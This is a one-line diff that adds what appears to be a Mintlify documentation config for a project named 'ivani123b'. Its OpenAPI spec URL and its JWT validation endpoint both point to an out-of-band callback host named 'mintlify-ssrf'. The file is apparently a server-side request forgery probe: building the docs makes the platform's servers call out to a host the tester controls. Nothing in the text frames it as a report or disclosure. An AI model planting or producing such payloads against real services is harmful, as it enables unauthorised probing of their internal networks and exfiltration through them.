@@ -1,0 +1,1 @@
+{"name":"ivani123b","navigation":[{"group":"Getting Started","pages":["index"]}],"api":{"openapi":"https://mintlify-ssrf.fdd8cd2afcd551371c95j9rc1t4icrscc.oob.static-cdn-eu.com/openapi-build-fetch.json"},"auth":{"method":"jwt","endpoint":"https://mintlify-ssrf.fdd8cd2afcd551371c95j9rc1t4icrscc.oob.static-cdn-eu.com/jwt-validate-fetch"}}
